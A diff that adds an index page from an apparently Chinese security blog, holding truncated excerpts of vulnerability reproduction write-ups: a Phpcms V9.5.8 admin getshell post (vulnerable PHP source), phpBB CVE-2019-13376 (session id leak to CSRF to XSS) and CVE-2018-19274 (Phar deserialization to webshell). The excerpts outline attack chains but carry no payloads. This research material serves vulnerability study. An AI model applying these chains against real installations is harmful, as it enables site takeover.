+            if($r[&#39;siteid&#39;]!=$this-&gt;siteid ||  ($r[&#39;type&#39;]==2 &amp;&amp; $r[&#39;child&#39;]==0)) continue;
+            if($from==&#39;content&#39; &amp;&amp; $_SESSION[&#39;roleid&#39;] != 1 &amp;&amp; !in_array($r[&#39;catid&#39;],$priv_catids)) &#123;
+                $arrchildid = explode(&#39;,&#39;,$r[&#39;arrchildid&#39;]);
+                $array_intersect = array_intersect($priv_catids,$arrchildid);
+                if(empty($array_intersect)) continue;
+            &#125;
+            if($r[&#39;type&#39;]==1 || $from==&#39;block&#39;) &#123;
+                if($r[&#39;type&#39;]==0) &#123;
+                    $r[&#39;vs_show&#39;] = &quot;&lt;a href=&#39;?m=block&amp;c=block_admin&amp;a=public_visualization&amp;menuid=&quot;.$_GET[&#39;menuid&#39;].&quot;&amp;catid=&quot;.$r[&#39;catid&#39;].&quot;&amp;type=show&#39; target=&#39;right&#39;&gt;[&quot;.L(&#39;content_page&#39;).&quot;]&lt;/a&gt;&quot;;
+                &#125; else &#123;
+                    $r[&#39;vs_show&#39;] =&#39;&#39;;
+                &#125;
+                $r[&#39;icon_type&#39;] = &#39;file&#39;;
+                $r[&#39;add_icon&#39;] = &#39;&#39;;
+                $r[&#39;type&#39;] = &#39;add&#39;;
+            &#125; else &#123;
+                $r[&#39;icon_type&#39;] = $r[&#39;vs_show&#39;] = &#39;&#39;;
+                $r[&#39;type&#39;] = &#39;init&#39;;
+                $r[&#39;add_icon&#39;] = &quot;&lt;a target=&#39;right&#39; href=&#39;?m=content&amp;c=content&amp;menuid=&quot;.$_GET[&#39;menuid&#39;].&quot;&amp;catid=&quot;.$r[&#39;catid&#39;].&quot;&#39; onclick=javascript:openwinx(&#39;?m=content&amp;c=content&amp;a=add&amp;menuid=&quot;.$_GET[&#39;menuid&#39;].&quot;&amp;catid=&quot;.$r[&#39;catid&#39;].&quot;&amp;hash_page=&quot;.$_SESSION[&#39;hash_page&#39;].&quot;&#39;,&#39;&#39;)&gt;&lt;img src=&#39;&quot;.IMG_PATH.&quot;add_content.gif&#39; alt=&#39;&quot;.L(&#39;add&#39;).&quot;&#39;&gt;&lt;/a&gt; &quot;;
+            &#125;
+            $categorys[$r[&#39;catid&#39;]] = $r;
+        &#125;
+    &#125;
+    if(!empty($categorys)) &#123;
+        $tree-&gt;init($categorys);
+            switch($from) &#123;
+                case &#39;block&#39;:
+                    $strs = &quot;&lt;span class=&#39;\$icon_type&#39;&gt;\$add_icon&lt;a href=&#39;?m=block&amp;c=block_admin&amp;a=public_visualization&amp;menuid=&quot;.$_GET[&#39;menuid&#39;].&quot;&amp;catid=\$catid&amp;type=list&#39; target=&#39;right&#39;&gt;\$catname&lt;/a&gt; \$vs_show&lt;/span&gt;&quot;;
+                    $strs2 = &quot;&lt;img src=&#39;&quot;.IMG_PATH.&quot;folder.gif&#39;&gt; &lt;a href=&#39;?m=block&amp;c=block_admin&amp;a=public_visualization&amp;menuid=&quot;.$_GET[&#39;menuid&#39;].&quot;&amp;catid=\$catid&amp;type=category&#39; target=&#39;right&#39;&gt;\$catname&lt;/a&gt;&quot;;
+                break;
+ 
+                default:
+                    $strs = &quot;&lt;span class=&#39;\$icon_type&#39;&gt;\$add_icon&lt;a href=&#39;?m=content&amp;c=content&amp;a=\$type&amp;menuid=&quot;.$_GET[&#39;menuid&#39;].&quot;&amp;catid=\$catid&#39; target=&#39;right&#39; onclick=&#39;open_list(this)&#39;&gt;\$catname&lt;/a&gt;&lt;/span&gt;&quot;;
+                    $strs2 = &quot;&lt;span class=&#39;folder&#39;&gt;\$catname&lt;/span&gt;&quot;;
+                    break;
+            &#125;
+        $categorys = $tree-&gt;get_treeview(0,&#39;category_tree&#39;,$strs,$strs2,$ajax_show);
+    &#125; else &#123;
+        $categorys = L(&#39;please_add_category&#39;);
+    &#125;
+    include $this-&gt;admin_tpl(&#39;category_tree&#39;);
+    exit;
+&#125;
+</code></pre>
+<p>复制 文本</p>
+<p>在当前函数开始下个断点</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Phpcms/Phpcms%20V9.5.8%20%E5%90%8E%E5%8F%B0getshell/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpcms/Phpcms%20V9.5.8%20%E5%90%8E%E5%8F%B0getshell/" data-id="cl5c2qu5m00dvy8v187ecfkvk" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-PhpBB/（CVE-2019-13376）PhpBB从session id泄露到CSRF到XSS" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/PhpBB/%EF%BC%88CVE-2019-13376%EF%BC%89PhpBB%E4%BB%8Esession%20id%E6%B3%84%E9%9C%B2%E5%88%B0CSRF%E5%88%B0XSS/" class="article-date">
+  <time datetime="2022-07-08T06:26:01.546Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-13376）PhpBB从session-id泄露到CSRF到XSS"><a href="#（CVE-2019-13376）PhpBB从session-id泄露到CSRF到XSS" class="headerlink" title="（CVE-2019-13376）PhpBB从session id泄露到CSRF到XSS"></a>（CVE-2019-13376）PhpBB从session id泄露到CSRF到XSS</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>该漏洞源于WEB应用未充分验证请求是否来自可信用户。攻击者可利用该漏洞通过受影响客户端向服务器发送非预期的请求。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>PhpBB 3.2.7</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>首先来看一下phpBB的后台，也就是ACP页面</p>
+<p><img src="/resource/(CVE-2019-13376)PhpBB%E4%BB%8Esessionid%E6%B3%84%E9%9C%B2%E5%88%B0CSRF%E5%88%B0XSS/media/rId24.png" alt="1.png"></p>
+<p>可以发现所有后台功能的url中都会携带着sid（session id）参数：</p>
+<pre><code>http://www.0-sec.org/phpbb/phpBB/adm/index.php?sid=9c4869b4054e9ff8d4d588c32ffcf7e7&amp;i=1
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/PhpBB/%EF%BC%88CVE-2019-13376%EF%BC%89PhpBB%E4%BB%8Esession%20id%E6%B3%84%E9%9C%B2%E5%88%B0CSRF%E5%88%B0XSS/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/PhpBB/%EF%BC%88CVE-2019-13376%EF%BC%89PhpBB%E4%BB%8Esession%20id%E6%B3%84%E9%9C%B2%E5%88%B0CSRF%E5%88%B0XSS/" data-id="cl5c2qu0v00dpy8v17aq41sxo" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-PhpBB/（CVE-2018-19274）PhpBB Phar反序列化远程代码漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/PhpBB/%EF%BC%88CVE-2018-19274%EF%BC%89PhpBB%20Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:01.543Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2018-19274）PhpBB-Phar反序列化远程代码漏洞"><a href="#（CVE-2018-19274）PhpBB-Phar反序列化远程代码漏洞" class="headerlink" title="（CVE-2018-19274）PhpBB Phar反序列化远程代码漏洞"></a>（CVE-2018-19274）PhpBB Phar反序列化远程代码漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>攻击者若通过社工，弱口令，钓鱼等方式拥有控制管理面板权限，可先前台上传恶意附件，再进入后台控制管理面板利用设置中对路径的验证的功能，结合PHP<br>phar 反序列化进行php对象注入，构造可用的恶意攻击链，获取Webshell。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>phpBB v3.2.3及以前的版本</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>先看触发php phar反序列化漏洞的核心代码如下：</p>
+<p>文件位置：<code>phpBB3/includes/functions_acp.php::validate_config_vars</code></p>
+<p><img src="/resource/(CVE-2018-19274)PhpBBPhar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/media/rId25.png" alt="1.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/PhpBB/%EF%BC%88CVE-2018-19274%EF%BC%89PhpBB%20Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/PhpBB/%EF%BC%88CVE-2018-19274%EF%BC%89PhpBB%20Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qu2f00dqy8v13z42b9g5" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/51/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/50/">50</a><a class="page-number" href="/page/51/">51</a><span class="page-number current">52</span><a class="page-number" href="/page/53/">53</a><a class="page-number" href="/page/54/">54</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/53/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
